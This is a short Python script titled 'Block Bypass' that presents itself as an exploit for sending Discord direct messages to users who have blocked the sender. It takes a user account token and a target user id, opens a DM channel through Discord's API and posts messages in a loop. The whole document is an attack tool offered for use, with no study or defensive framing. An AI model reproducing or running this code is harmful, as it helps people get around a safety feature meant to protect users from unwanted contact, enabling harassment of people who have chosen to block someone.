# Name: Block Bypass
# Description: Send messages to blocked users
# Author: checksum (@0daySkid)
# Original founder: Yaekith

import requests
import sys

class Exploit:

    def __init__(self, token, client):
        self.token = token
        self.client_id = client
        self.headers = {'Authorization': token}


    def _get_channel_id(self, client_id):
        """ return channel id from client id """
        res = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=self.headers, json={'recipient_id': self.client_id})
        return res.json().get('id')


    def execute(self, message):
        """ send message to client """
        channel_id = self._get_channel_id(self.client_id)
        return requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=self.headers, json={'content': message})

    
def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <token> <client id>')
        sys.exit()

    token = sys.argv[1]
    client_id = sys.argv[2]

    exploit = Exploit(token, client_id)

    while True:
        message = input("Message > ")
        if not message:
            continue

        exploit.execute(message)


if __name__ == '__main__':
    main()
